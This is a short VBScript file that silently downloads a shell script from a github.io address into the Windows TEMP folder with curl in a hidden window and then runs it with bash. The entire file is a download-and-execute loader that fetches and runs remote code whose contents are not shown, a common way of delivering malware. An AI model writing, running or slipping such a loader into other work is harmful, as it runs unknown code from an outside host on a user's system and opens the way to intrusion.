Set objShell = CreateObject("WScript.Shell")
strURL = "https://sabbir28.github.io/s/gui_script.sh"

strScriptPath = objShell.ExpandEnvironmentStrings("%TEMP%\gui_script.sh")

' Download the script using curl
objShell.Run "curl -sSL " & strURL & " -o " & strScriptPath, 0, True

' Execute the downloaded script using bash
objShell.Run "bash " & strScriptPath, 1, True
